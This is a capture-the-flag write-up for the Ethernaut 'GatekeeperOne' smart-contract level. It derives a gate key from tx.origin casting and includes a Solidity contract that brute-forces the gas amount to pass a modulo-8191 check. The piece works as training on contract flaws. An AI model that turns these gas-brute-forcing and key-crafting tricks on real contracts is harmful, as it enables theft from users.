#GatekeeperOne

This level is split into 3 parts.

The first part has us require a proxy contract like the telephone level. We can
simply deploy our own contract to interact with the level.

The second part we will skip for now.

The third part has us do some casting conversions and we will work backwards from
third require statement. We take the last 4 hex values
of our tx.origin and compare it against the last 8 hex values of our key. This means
that the key will be a 4 hex padded value of the tx.origin.

> uint16(uint160(tx.origin)) = 0xDC2F
> therefore
> uint32(uint64(\_gateKey)) = 0x0000DC2F

Then we now check that the full length of the key is not the same as the half, we can make sure
by adding a single 1 in the padded key.

> uint64(\_gateKey) = 0x100000000000DC2F

And the first check is the same as the third so we don't have to worry.

Now in part 2, we have to calculate when the gasleft is a multiple of 8191. One might
try to submit a call with gas that is equivalent to that multiple, however, it seems like
the gas sent with the call is not the same as the gasleft when the checks are processed.
Therefore we can just bruteforce our way in.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface IGatekeeperOne {
    function enter(bytes8) external returns (bool);
}

contract GatekeeperPass {
    address immutable i_gatekeeperAddress;
    bool public success;
    uint256 public gas;
    constructor(address _gatekeeperAddress) {
        i_gatekeeperAddress = _gatekeeperAddress;
    }

    function unlock(bytes8 _gateKey) public {
        for(uint i = 0; i < 8191; i++) {
            (bool _success, ) = i_gatekeeperAddress.call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if(_success) {
                success = _success;
                break;
            }
        }
    }
    // gateskey: 0x100000000000DC2F
    // tx.origin: 0xDC2F
}
```
